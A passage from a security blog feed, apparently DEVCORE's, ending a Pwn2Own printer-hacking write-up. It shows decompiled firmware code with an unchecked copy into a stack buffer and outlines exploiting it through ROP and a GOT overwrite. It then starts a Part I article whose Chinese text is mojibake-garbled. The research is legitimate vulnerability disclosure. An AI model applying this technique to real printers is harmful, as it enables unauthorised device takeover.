  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// t1&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r7&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r8&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+8h] [bp-D8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;second_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+28h] [bp-B8h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [sp+48h] [bp-98h] BYREF&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Scan/UserReadyToScan&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x15u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Scan/Jobs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xAu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_37:&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_DEBUG_syslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;REST_SCAN_DEBUG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x411FA215&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_req_ifc_tbl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//------------------------------------------------------ [2]  &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;next_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Pages&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dword_5DBC8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first_path_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_send_scan_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rest_scan_vp_thread_created&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_send_err_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;But when it parse the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pathinfo&lt;/code&gt; at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt;, it does not check the length of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pathinfo&lt;/code&gt;. Then copy the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pathinfo&lt;/code&gt; to the local buffer(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;first_path_info[32]&lt;/code&gt;), which leads to a stack overflow.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We can construct the request to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Scan/Jobs/&lt;/code&gt; to trigger it. It does not have Stack Guard, so we can overwrite the return address directly. But it has DEP, we need to do ROP to achieve our goal. Finally, we use ROP to overwrite the GOT of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strncmp&lt;/code&gt;. After overwriting it, we can execute arbitrary commands when we access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Copy/{cmd}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;However, in the end, this vulnerability collided with another teamâ€™s discovery.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;Based on the results from Pwn2Own Austin 2021 to Pwn2Own Toronto 2022, printer security remains an easily overlooked issue. In just one year, the number of teams capable of compromising printers has significantly increased. Even in the third year, at &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2023/10/23/pwn2own-toronto-2023-the-schedule&quot;&gt;Pwn2Own Toronto 2023&lt;/a&gt;, many teams still found vulnerabilities. It is recommended for everyone using these IoT devices to turn off unnecessary services, set up firewalls properly, and ensure appropriate access controls to reduce the risk of attacks.&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2-en/</link>
                <guid>https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2-en</guid>
                <pubDate>Mon, 06 Nov 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your printer is not your printer ! - Hacking Printers at Pwn2Own Part I</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å°è¡¨æ©Ÿè¿‘å¹´ä¾†å·²æˆç‚ºä¼æ¥­å…§ç¶²ä¸­ä¸å¯æˆ–ç¼ºçš„è¨­å‚™ä¹‹ä¸€ï¼ŒåŠŸèƒ½ä¹Ÿéš¨è‘—ç§‘æŠ€çš„ç™¼å±•æ—¥ç›Šå¢å¤šï¼Œé™¤äº†ä¸€èˆ¬çš„å‚³çœŸåŠåˆ—å°ä¹‹å¤–ï¼Œä¹Ÿé–‹å§‹æ”¯æ´ AirPrint ç­‰é›²ç«¯åˆ—å°æœå‹™ï¼Œè®“åˆ—å°æ›´åŠ æ–¹ä¾¿ï¼Œç›´æ¥ä½¿ç”¨è¡Œå‹•è£ç½®å°±å¯ä»¥è¼•é¬†åˆ—å°ï¼Œæ›´æˆç‚ºäº† IoT ä¸­ï¼Œä¸å¯æˆ–ç¼ºçš„ä¸€ç’°ï¼Œæ­£å› ç‚ºå…¶ä¾¿åˆ©ï¼Œä¹Ÿå¸¸è¢«ç”¨æ–¼åˆ—å°å…¬å¸å…§éƒ¨æ©Ÿæ•æ–‡ä»¶ï¼Œä½¿å¾—åœ¨ä¼æ¥­ä¸­å°è¡¨æ©Ÿçš„å®‰å…¨æ€§æ›´åŠ çš„é‡è¦ã€‚&lt;/p&gt;

&lt;p&gt;è€Œå‰å¹´æˆ‘å€‘ä¹Ÿåœ¨ Canon åŠ HP çš„å°è¡¨æ©Ÿä¸­ç™¼ç¾äº† Pre-auth RCE çš„æ¼æ´(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-515/&quot;&gt;CVE-2022-24673&lt;/a&gt; åŠ &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-532/&quot;&gt;CVE-2022-3942&lt;/a&gt;) åŠ Lexmark ç™¼ç¾æ¼æ´(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-332/&quot;&gt;CVE-2021-44734&lt;/a&gt;)ï¼Œä¸¦åœ¨ Pwn2Own Austin 2021 ä¸­å–å¾—äº† Canon ImageCLASS MF644Cdwã€ HP Color LaserJet Pro MFP M283fdw åŠ Lexmark MC3224i çš„æ§åˆ¶æ¬Šï¼Œè€ŒæˆåŠŸç²å¾— Pwn2Own ä¸­é§­å®¢å¤§å¸«(Master of Pwn) çš„é»æ•¸ï¼Œé€™ç¯‡ç ”ç©¶å°‡è¬›è¿° Canon åŠ HP æ¼æ´çš„ç´°ç¯€åŠæˆ‘å€‘çš„åˆ©ç”¨æ–¹å¼ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ­¤ä»½ç ”ç©¶äº¦ç™¼è¡¨æ–¼ &lt;a href=&quot;https://hitcon.org/2022/agenda/704bf58c-c42b-4593-97c0-9aba91caa6e4&quot;&gt;HITCON 2022&lt;/a&gt; åŠ &lt;a href=&quot;https://codeblue.jp/2022/en/talks/&quot;&gt;CODE BLUE 2022&lt;/a&gt;ï¼Œä½ å¯ä»¥å¾&lt;a href=&quot;https://hitcon.org/2022/slides/Your%20Printer%20is%20not%20your%20Printer%20!%20-%20Hacking%20Printers%20at%20Pwn2Own.pdf&quot;&gt;é€™è£¡&lt;/a&gt;å–å¾—æŠ•å½±ç‰‡ï¼&lt;/p&gt;

&lt;h2 id=&quot;printer&quot;&gt;Printer&lt;/h2&gt;
&lt;p&gt;æ—©æœŸåœ¨ä½¿ç”¨å°è¡¨æ©Ÿæ™‚ï¼Œå¾€å¾€æœƒéœ€è¦ä½¿ç”¨ IEEE1284 æˆ–æ˜¯ USB çš„ Printer cable ä¾†å°‡å°è¡¨æ©Ÿæ¥ä¸Šé›»è…¦ï¼Œä¸¦ä¸”åœ¨ä½¿ç”¨æ™‚æœƒé¡å¤–è£ä¸Šå» å•†æ‰€é™„çš„é©…å‹•ç¨‹å¼ã€‚è€Œç¾ä»Šçš„å°è¡¨æ©Ÿå·²å¯ä»¥æ¥ä¸Šç¶²è·¯ï¼Œä¸¦å¤šäº†å„å¼å„æ¨£çš„åŠŸèƒ½ï¼Œé€šå¸¸åªè¦å°‡å°è¡¨æ©Ÿæ¥ä¸Šå€ç¶²ï¼Œå€ç¶²ä¸­çš„é›»è…¦å°±å¯ä»¥è¼•æ˜“åœ°ç™¼ç¾ä½ æ‰€æ–°å®‰è£çš„å°è¡¨æ©Ÿã€‚&lt;/p&gt;

